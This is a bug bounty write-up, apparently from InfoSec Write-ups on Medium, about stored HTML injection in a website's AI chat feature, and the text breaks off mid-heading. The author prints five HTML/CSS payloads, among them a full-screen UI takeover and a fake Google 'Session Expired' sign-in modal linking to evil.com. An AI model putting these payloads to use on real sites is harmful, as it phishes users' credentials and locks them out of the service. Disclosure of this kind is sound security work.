---
title: “Click Once, Chat Never Again” — The Low Severity Bug That Hijacked the AI Chat Forever
url: https://infosecwriteups.com/click-once-chat-never-again-the-low-severity-bug-that-hijacked-the-ai-chat-forever-5f5579dfdc67?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-07-08
fetch_date: 2025-10-06T23:24:24.590870
---

# “Click Once, Chat Never Again” — The Low Severity Bug That Hijacked the AI Chat Forever

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F5f5579dfdc67&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fclick-once-chat-never-again-the-low-severity-bug-that-hijacked-the-ai-chat-forever-5f5579dfdc67&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fclick-once-chat-never-again-the-low-severity-bug-that-hijacked-the-ai-chat-forever-5f5579dfdc67&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-5f5579dfdc67---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-5f5579dfdc67---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# 💻This Is How You Hijack an Al with Almost No Effort 🤫👉🏻💻.

[![LordofHeaven](https://miro.medium.com/v2/resize:fill:64:64/1*KZRV0GWTj8BUGxiz_w7oPg.png)](https://lordofheaven1234.medium.com/?source=post_page---byline--5f5579dfdc67---------------------------------------)

[LordofHeaven](https://lordofheaven1234.medium.com/?source=post_page---byline--5f5579dfdc67---------------------------------------)

5 min read

·

Jul 7, 2025

--

Listen

Share

Press enter or click to view image in full size

![]()

> One line. One message. *And the AI chat? Gone. For good.*
>
> *No refresh could fix it.
>  No logout could reverse it.
>  No support option could bring it back.*
>
> *It wasn’t an RCE.
>  It wasn’t even XSS.*
>
> *It was just HTML…Or so it seemed. 😶‍🌫*

## 🛏️ How Sleep Turned Into a Hack

It was late.
 I was winding down after a long day.
 A few background songs playing.
 Eyes half-shut.
 No tools open. Just casually clicking through redacted.xyz

Then I noticed a new feature: **“Create with AI”**.

“Let’s try it,” I thought, yawning.

> *Spoiler: I didn’t sleep after that for an hour😈*

## 😈 First Sign of Something Off

I typed a basic message. Nothing special.
 Then, almost out of boredom, I pasted an anchor tag:

```
<a href="https://google.com" style="color: red; font-size: 20px; font-weight: bold; text-decoration: none;">Click here to win $25</a>
```

![]()

1st image !

Expected? Escaped plain text.
 Actual result?
 **Rendered.**
 **Styled.**
 **Clickable.**

It was sitting there inside the AI chat UI — as if it belonged.

## 🧪 Escalation Begins

And here’s where most folks would shrug.
 “It’s just HTMLi, bro. Who cares?”

And then they’d say:

> “Brooo you’re so mad, you probably didn’t even try to escalate to XSS or SSTI.”

Well guess what?

> *✅ I did.*

I tried **multiple XSS chains**.
 I tested **SSTI** across template syntaxes.
 I looked for **CSRF bypass possibilities**.
 I poked everything.

But the app was smart enough to block script execution.
 It wasn’t smart enough to block… **HTML**.

> *And with the right CSS?
>  That’s* all I needed.

## 🎭 Payload Showcase: Death by `<div>`

🔗 1. Styled Phishing CTA

```
<a href="https://google.com" style="color:red; font-size:20px; font-weight:bold; text-decoration:none;">Click here to win $25</a>
```

Looks legit.
 Clickable.
 Perfectly placed in a chat bubble.

💀 2. System Compromised Banner

```
<div style="background:#111; color:#0f0; padding:15px; font-family:monospace; border:5px groove red;">
  <h3>💀 System Compromised 💀</h3>
  <p>This chat is now under the control of <strong>LordOfHeaven</strong>.</p>
</div>
```

![]()

Img 2

Mimics a hacked terminal.
 Scary for users. Easy to trust the embedded links.

🚨 3. Security Alert + Fake “Secure Account” Button

```
<div style="background:red; color:white; padding:20px; font-size:20px;">
  <strong>🚨 Security Alert</strong><br>
  Unauthorized activity detected.<br>
  <a href="http://evil.com" style="background:black; color:red; padding:10px;">Secure Account</a>
</div>
```

![]()

img 3

Clickbait. Fear-based manipulation.
 Looks like a system warning.

🧨 4. Full-Screen Takeover (Stored)

```
<div style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:black; color:lime; z-index:999999; font-family:monospace; padding:30px; box-sizing:border-box;">
  <h1 style="color:red; font-size:40px; text-align:center;">💀 CHAT SYSTEM COMPROMISED 💀</h1>
  <hr style="border:1px solid red;">
  <p style="font-size:20px; text-align:center;">
    This live chat session has been <strong style="color:red;">seized</strong> by
    <span style="color:yellow;">LORD</span>.
  </p>
  <p style="font-size:18px; margin-top:40px; text-align:center;">
    All messages are being logged and exfiltrated.
  </p>
  <p style="text-align:center; margin-top:50px;">
    Contact <a href="http://evil.com" style="color:#ff0; text-decoration:underline;">Security Operations</a> to regain access.
  </p>
</div>
Result: A
```

Press enter or click to view image in full size

![]()

This one **blocks the entire UI**.

* No input
* No scroll
* No fix
* **No escape**

And most importantly?

> ***It gets stored.*** *Cross-session. Cross-browser. Cross-device.* ***Forever.***

⚠️ 5. Fake “Session Expired” Login Modal

```
<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:#fff;color:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif;z-index:9999;">
  <h2 style="color:red;">⚠️ Session Expired</h2>
  <p>Please sign in again to continue.</p>
  <a href="http://evil.com" style="padding:10px 20px; background:#007bff; color:white; text-decoration:none; font-weight:bold; margin-top:20px;">Sign in with Google</a>
</div>Pixel-perfect impersonation of Google login.
 Injected inside the AI.
 Stored. Forever.
```

Press enter or click to view image in full size

![]()

## 🔁 The Payload Didn’t Just Stick — It Stalked

At first, I thought maybe I’d broken the whole app.

But then I noticed something eerie…

> *I could still use everything else on the site.
>  Dashboard? ✅
>  Account settings? ✅
>  Projects? ✅*

But the **moment I clicked “Create with AI”** again…
 That same full-screen payload came back.
 Same hijack.
 Same block.

The chat was cursed.

> *A message I sent — now* ***haunting my own account*** *across time, sessions, and devices.*

## 💡 A Thought Hit Me…

This was bad enough already.
 But what if…

What if there’s someone on the *other side*?

Like, what if:

* The AI sends conversations to admins?
* There’s an internal dashboard showing chats?
* Support staff or moderators **read raw user input**?

And now **my fake login page is showing up in their interface too?**

> *All it takes is one careless rendering engine on their side —
>  and boom. Instant internal phishing.*

A whisper of a payload.
 An avalanche of consequences.

## 📬 Repor...